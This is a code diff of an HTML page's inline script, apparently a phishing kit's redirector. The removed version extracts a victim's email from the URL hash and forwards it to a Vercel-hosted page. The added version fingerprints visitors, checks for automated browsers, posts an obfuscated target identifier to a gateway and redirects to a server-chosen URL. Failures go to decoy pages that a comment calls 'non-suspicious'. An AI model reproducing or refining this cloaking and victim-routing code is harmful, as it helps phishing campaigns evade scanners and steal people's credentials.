@@ -1,33 +1,77 @@
-<!DOCTYPE html><html><head>
-<meta charset="utf-8"><script>
-onload=_=>{
-  let h = decodeURIComponent(location.hash.slice(1)).replace(/[%0-9A-F]{2}/gi, m=>m==='%40'?'@':m).trim();
-  h = h.replace(/[\r\n].*$/g,''); // kill newlines
+<!DOCTYPE html>
+<html lang="en">
 
-  let raw = '';
-  try {
-    let qs = h.includes('?') ? h.split('?')[1] : h;
-    let p = new URLSearchParams(qs);
-    for (let v of p.values()) {
-      if (v && (v.includes('@') || /^[A-Za-z0-9+/=]+$/.test(v))) { raw = v; break; }
-    }
-  } catch(e) {}
-  if (!raw && (h.includes('@') || /^[A-Za-z0-9+/=]+$/.test(h))) raw = h.split('?')[0];
+<head>
+    <script type="module" nonce="C96O89mukLsGd/ZHL49G/g==">
+        // Config is now minimal and clean.
+        const XENIX_CONFIG = {
+            fingerprintPublicKey: "9Pvrr6FkrL2vBav6BCSV",
+            fingerprintRegion: "eu",
+            encodedTargetIdentifier: "t92YuMXZpRXay9WayB3ZulGazlmZANXZpxmZ",
+            analyzeSignalsEndpoint: "/api/v1/gateway/analyze-signals"
+        };
 
-  if (!raw) return;
+        // --- DOM Element Selectors ---
+        const logoEl = document.querySelector('.main-logo');
+        const loadingStateEl = document.getElementById('loading-state');
+        const errorStateEl = document.getElementById('error-state');
+        const errorTitleEl = document.getElementById('error-title');
+        const errorMessageEl = document.getElementById('error-message');
 
-  let email = raw;
-  // First: try Base64
-  if (/^[A-Za-z0-9+/=]+$/.test(email)) {
-    try { email = atob(email); } catch(e) {}
-  }
-  // Then: fix %40 → @ if still no @
-  if (!email.includes('@') && email.includes('%40')) {
-    email = email.replace(/%40/gi, '@');
-  }
-  // Final validation
-  if (/^\S+@\S+\.\S+$/.test(email)) {
-    location.replace("https://sampe210.vercel.app#" + email);
-  }
-}
-</script></head><body></body></html>
+        function showErrorState(title, message) {
+            logoEl.classList.add('hidden');
+            errorTitleEl.textContent = title;
+            errorMessageEl.textContent = message;
+            loadingStateEl.classList.add('hidden');
+            errorStateEl.classList.remove('hidden');
+        }
+
+        /**
+         * The main function that runs analysis and handles the new API contract.
+         */
+        async function runAnalysis() {
+            try {
+                const FingerprintJS = await import(`https://fpjscdn.net/v3/${XENIX_CONFIG.fingerprintPublicKey}`);
+                const fp = await FingerprintJS.load({ region: XENIX_CONFIG.fingerprintRegion });
+                const result = await fp.get({ extendedResult: true });
+
+                const payload = {
+                    requestId: result.requestId,
+                    visitorId: result.visitorId,
+                    encodedTargetIdentifier: XENIX_CONFIG.encodedTargetIdentifier,
+                    clientWebdriver: navigator.webdriver || false
+                };
+
+                const response = await fetch(XENIX_CONFIG.analyzeSignalsEndpoint, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+
+                // --- NEW, SIMPLIFIED RESPONSE HANDLING ---
+                const data = await response.json();
+
+                if (response.status === 200 && data.url) {
+                    // Success OR Deflection -> Just redirect.
+                    window.location.href = data.url;
+                } else if ((response.status === 422 || response.status === 503) && data.title && data.message) {
+                    // User-Correctable OR Server Error -> Show message and wait.
+                    showErrorState(data.title, data.message);
+                } else {
+                    // Fallback for any other unexpected case.
+                    // We'll redirect to a hardcoded, generic, non-suspicious page.
+                    window.location.href = 'https://tee29.vercel.app';
+                }
+
+            } catch (error) {
+                // A total client-side failure (e.g., network error, ad blocker).
+                console.error('Xenix Interstitial Client-Side Error:', error);
+                window.location.href = 'https://samperd1011.netlify.app#';
+            }
+        }
+
+        document.addEventListener('DOMContentLoaded', runAnalysis);
+    </script>
+</body>
+
+</html>
